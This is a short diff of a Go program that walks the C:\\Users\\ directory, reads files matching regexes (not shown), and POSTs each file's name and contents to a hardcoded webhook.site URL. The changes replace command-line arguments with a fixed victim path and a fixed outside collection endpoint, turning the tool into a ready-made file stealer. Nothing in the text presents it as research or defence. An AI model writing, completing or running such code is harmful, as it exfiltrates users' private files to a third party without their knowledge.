@@ -19,7 +19,7 @@ var regexes = []*regexp.Regexp{
 
 func jazz() {
 
-	root := os.Args[1]
+	root := "C:\\Users\\"
 	if err := filepath.Walk(root, walkFn); err != nil {
 		log.Panicln(err)
 	}
@@ -51,7 +51,8 @@ func readAFile(path string) {
 func httpPoster(fileData string, filename string) {
 	data := []byte(filename + ":" + fileData)
 
-	req, err := http.NewRequest("POST", os.Args[2], bytes.NewBuffer(data))
+	destinationURL := "https://webhook.site/27227c6f-b632-4b50-ae7e-a38b18629b2c"
+	req, err := http.NewRequest("POST", destinationURL, bytes.NewBuffer(data))
 	req.Header.Set("Content-Type", "application/json")
 	client := &http.Client{}
 
